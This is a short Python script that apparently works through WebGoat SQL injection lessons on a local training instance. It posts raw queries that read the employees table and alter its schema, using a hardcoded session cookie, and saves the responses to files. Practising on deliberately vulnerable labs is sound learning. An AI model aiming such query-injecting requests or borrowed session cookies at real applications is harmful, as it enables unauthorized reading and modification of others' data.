import requests
import json

def api_call(url,data,filename):

    # Add your session cookies here
    cookies = {
        "JSESSIONID": "Un341K6x6s9O0UdsDJB9g3DKl6mI9NQZvFQtKSPI",
        # Replace this with the actual session ID
    }

    # Make the POST request with cookies
    response = requests.post(url, data=data, cookies=cookies)

    # Print the response
    print("Status Code:", response.status_code)
    print("Response:", response.text)

    # Convert the response text to a JSON object
    response_json = json.loads(response.text)

    with open(filename, 'w') as f:
        response_json["output"] = response_json["output"].replace('\n', '')
        response_json["output"] = response_json["output"].replace('\\', '')
        f.write(response_json["output"])




data_check_all = {
        "query" : "SELECT * FROM employees"
}

url_check_all = "http://localhost:8080/WebGoat/SqlInjection/attack2direct?username=Bando01"


url = 'http://localhost:8080/WebGoat/SqlInjection/attack4?username=Bando01'

query = "ALTER TABLE employees ADD COLUMN phone varchar(20)"

data = {
    "query" : query
}



# Call the function
api_call(url_check_all, data_check_all, 'aaaaaaaaa.json')
# api_call(url, data, 'alterResult.json')
# api_call(url_check_all, data_check_all, 'secondCheck.json')

